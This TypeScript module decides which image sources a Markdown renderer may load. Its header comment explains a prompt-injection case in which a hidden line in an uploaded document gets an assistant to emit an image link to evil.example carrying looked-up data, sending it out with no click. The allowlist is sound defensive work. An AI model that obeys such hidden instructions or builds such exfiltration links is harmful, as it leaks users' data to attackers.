/**
 * Which image addresses Markdown may load.
 *
 * Markdown from an AI reply, a task note or any other text a third party can
 * influence must not make the browser fetch an address it picked: a hidden line
 * in an uploaded document can tell the assistant to write
 * `![x](https://evil.example/a.png?d=<looked-up data>)`, and an <img> sends that
 * out with no click. So an image loads only from the page's own origin, a
 * relative path, a blob: or a data:image/ URL, or a host the caller names.
 * Everything else is shown as text and never requested.
 */

/** The host part of an address the browser would fetch, or "" when it is not an absolute http(s) URL. */
export function imageHost(src: string): string {
  try {
    const u = new URL(src);
    return u.protocol === "http:" || u.protocol === "https:" ? u.host : "";
  } catch {
    return "";
  }
}

/**
 * True when Markdown may render `src` as an <img>.
 *
 * @param origin the page origin (window.location.origin); "" when unknown (SSR, tests).
 * @param extraHosts hosts the caller trusts in addition, e.g. ["files.trf.is"]; exact match.
 */
export function isAllowedImageSrc(
  src: string | undefined | null,
  origin: string,
  extraHosts: readonly string[] = []
): boolean {
  if (!src) return false;
  const s = src.trim();
  if (s === "") return false;
  const lower = s.toLowerCase();
  if (lower.startsWith("blob:")) return true;
  if (lower.startsWith("data:")) return lower.startsWith("data:image/");
  // A scheme-relative //host/x would fetch another host: treat it as absolute.
  if (s.startsWith("//")) return isAllowedImageSrc("https:" + s, origin, extraHosts);
  // No scheme at all: a relative path on our own origin.
  if (!/^[a-z][a-z0-9+.-]*:/i.test(s)) return true;
  let u: URL;
  try {
    u = new URL(s);
  } catch {
    return false;
  }
  if (u.protocol !== "http:" && u.protocol !== "https:") return false;
  if (origin && u.origin === origin) return true;
  return extraHosts.some((h) => h.toLowerCase() === u.host.toLowerCase());
}
